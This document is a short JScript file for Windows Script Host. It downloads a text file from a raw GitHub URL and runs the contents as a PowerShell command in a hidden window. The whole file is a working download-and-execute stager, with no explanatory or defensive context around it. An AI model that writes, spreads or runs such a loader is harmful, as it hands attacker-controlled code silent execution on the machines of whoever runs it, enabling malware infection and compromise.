var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", "https://raw.githubusercontent.com/SandsWorkday/test4/refs/heads/main/test4.txt", false);
http.send();

if (http.status === 200) {
	var shell = new ActiveXObject("WScript.Shell");
	shell.Run("powershell.exe -C " + http.responseText, 0, true);
} else {
	WScript.Echo("HTTP error: " + http.status);
}
